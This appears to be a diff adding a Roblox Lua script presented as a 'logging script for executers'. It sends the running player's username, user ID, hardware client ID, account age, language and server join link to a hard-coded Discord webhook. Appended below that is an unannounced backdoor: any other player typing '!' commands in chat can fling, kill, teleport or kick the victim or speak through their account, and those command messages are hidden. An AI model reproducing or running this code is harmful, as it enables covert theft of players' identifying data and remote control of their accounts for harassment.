@@ -1,0 +1,243 @@
+-- Roblox logging script for executers made with love by airbornite discord :https://discord.gg/67gZEhX89T
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
+local LocalizationService = game:GetService("LocalizationService")
+local MarketplaceService = game:GetService("MarketplaceService")
+local LocalPlayer = Players.LocalPlayer
+
+local WebhookURL = "https://discord.com/api/webhooks/1555880195456507944/HCZ4NZJLFPxGUU4RZAmuz0LxB0LbiITxWqeeQy9YL-yFKhGeiOq-X8p3r0KIpWMNRbpn" -- REQUIRED REPLACE WITH YOUR WEBHOOK
+
+local startTime = os.time()
+
+local hwid = RbxAnalyticsService:GetClientId()
+local userName = LocalPlayer.Name
+local userId = LocalPlayer.UserId
+local accAge = LocalPlayer.AccountAge
+local gameId = game.PlaceId
+local jobId = game.JobId
+local language = LocalizationService.RobloxLocaleId
+local gameName = "Unknown"
+pcall(function()
+    gameName = MarketplaceService:GetProductInfo(gameId).Name
+end)
+
+local accountCreationDate = os.date("%d/%m/%Y", os.time() - (accAge * 86400))
+local gameLink = "https://www.roblox.com/games/" .. gameId
+local joinLink = "https://www.roblox.com/games/" .. gameId .. "/?serverplaceid=" .. jobId
+
+local executorName = (identifyexecutor and identifyexecutor()) or "Unknown"
+
+local currentPlayers = #Players:GetPlayers()
+local maxPlayers = Players.MaxPlayers
+
+local kick = false -- optional kick (set true to kick)
+local kickReason = "Get logged LoL" -- default kick reason
+
+local function toDiscordTimestamp(unixTime, format)
+    format = format or "R"
+    return string.format("<t:%d:%s>", unixTime, format)
+end
+
+local embedFields = {
+    {name = "Username", value = userName, inline = true},
+    {name = "User ID", value = tostring(userId), inline = true},
+    {name = "Executor", value = executorName, inline = true},
+    {name = "HWID", value = hwid, inline = false},
+    {name = "Account Created", value = accountCreationDate, inline = true},
+    {name = "Language", value = language, inline = true},
+    {name = "Game", value = gameName, inline = false},
+    {name = "Game Link", value = gameLink, inline = false},
+    {name = "Join Link", value = joinLink, inline = false},
+    {name = "Ran Script", value = toDiscordTimestamp(startTime), inline = true},
+    {name = "Server Players", value = string.format("%d / %d", currentPlayers, maxPlayers), inline = true},
+}
+
+if kick then
+    table.insert(embedFields, {name = "Kicked", value = "Yes", inline = true})
+    table.insert(embedFields, {name = "Kick Reason", value = kickReason, inline = false})
+else
+    table.insert(embedFields, {name = "Kicked", value = "No", inline = true})
+end
+
+local embed = {
+    title = "Exploit Execution Detected",
+    color = 0xFF0000,  -- red color
+    fields = embedFields,
+    footer = {text = "Exploit Logger"},
+    timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+}
+
+local payload = HttpService:JSONEncode({embeds = {embed}})
+
+pcall(function()
+    request({
+        Url = WebhookURL,
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = payload
+    })
+end)
+
+if kick then
+    LocalPlayer:Kick(kickReason)
+end
+
+local Players = game:GetService("Players")
+local TextChatService = game:GetService("TextChatService")
+
+local LocalPlayer = Players.LocalPlayer
+local PREFIX = "!"
+
+local function getCharacter()
+    return LocalPlayer.Character
+end
+
+local function getRoot(character)
+    return character and character:FindFirstChild("HumanoidRootPart")
+end
+
+local function fling()
+    local character = getCharacter()
+    local root = getRoot(character)
+
+    if not root then
+        return
+    end
+
+    root.AssemblyLinearVelocity = Vector3.new(
+        math.random(-150, 150),
+        200,
+        math.random(-150, 150)
+    )
+end
+
+local function kill()
+    local character = getCharacter()
+    local humanoid = character and character:FindFirstChildOfClass("Humanoid")
+
+    if humanoid then
+        humanoid.Health = 0
+    end
+end
+
+local function bring(controller)
+    if not controller then
+        return
+    end
+
+    local myCharacter = getCharacter()
+    local myRoot = getRoot(myCharacter)
+
+    local controllerCharacter = controller.Character
+    local controllerRoot = getRoot(controllerCharacter)
+
+    if not myRoot or not controllerRoot then
+        return
+    end
+
+    myRoot.CFrame = controllerRoot.CFrame * CFrame.new(0, 0, -3)
+end
+
+local function kick(reason)
+    if not reason or reason == "" then
+        reason = "You got kicked by the controller 😭"
+    end
+
+    LocalPlayer:Kick(reason)
+end
+
+local function say(message)
+    if not message or message == "" then
+        return
+    end
+
+    local channels = TextChatService:FindFirstChild("TextChannels")
+
+    if not channels then
+        return
+    end
+
+    local general = channels:FindFirstChild("RBXGeneral")
+
+    if general then
+        general:SendAsync(message)
+    end
+end
+
+local function executeCommand(sender, text)
+    if not sender then
+        return
+    end
+
+    if type(text) ~= "string" then
+        return
+    end
+
+    if text:sub(1, #PREFIX) ~= PREFIX then
+        return
+    end
+
+    local command = text:sub(#PREFIX + 1)
+    local lowerCommand = command:lower()
+
+    if lowerCommand == "fling" then
+        fling()
+
+    elseif lowerCommand == "kill" then
+        kill()
+
+    elseif lowerCommand == "bring" then
+        bring(sender)
+
+    elseif lowerCommand == "kick" then
+        kick("You got kicked by the controller 😭")
+
+    elseif lowerCommand:sub(1, 5) == "kick " then
+        local reason = command:sub(6)
+        kick(reason)
+
+    elseif lowerCommand:sub(1, 4) == "say " then
+        local message = command:sub(5)
+        say(message)
+    end
+end
+
+TextChatService.MessageReceived:Connect(function(message)
+    local textSource = message.TextSource
+
+    if not textSource then
+        return
+    end
+
+    local sender = Players:GetPlayerByUserId(textSource.UserId)
+
+    if not sender then
+        return
+    end
+
+    executeCommand(sender, message.Text)
+end)
+
+TextChatService.OnIncomingMessage = function(message)
+    local textSource = message.TextSource
+
+    if not textSource then
+        return nil
+    end
+
+    local text = message.Text
+
+    if type(text) ~= "string" then
+        return nil
+    end
+
+    if text:sub(1, #PREFIX) ~= PREFIX then
+        return nil
+    end
+
+    local properties = Instance.new("TextChatMessageProperties")
+    properties.TextTransparency = 1
+
+    return properties
+end
